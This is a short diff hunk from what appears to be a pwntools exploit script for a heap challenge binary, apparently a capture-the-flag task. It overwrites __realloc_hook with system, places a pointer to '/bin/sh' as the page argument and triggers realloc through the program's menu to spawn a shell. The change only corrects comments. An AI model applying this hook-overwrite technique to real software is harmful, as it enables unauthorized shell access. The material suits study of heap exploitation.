@@ -146,10 +146,10 @@ def pwn():
 	# __realloc_hook => system
 	edit_page(p64(system))
 	# realloc gets called with |page| as its first argument
-	# we'll overwrite |page| with /bin/
+	# we'll overwrite |page| with /bin/sh
 	change_name(p64(binsh))
 
-	# realloc(page, size); => page = system('sh')
+	# realloc(page, size); => page = system('/bin/sh')
 	r.sendlineafter('exit\n', '3')
 	r.sendlineafter('(bytes):\n', str(0x100))
 	
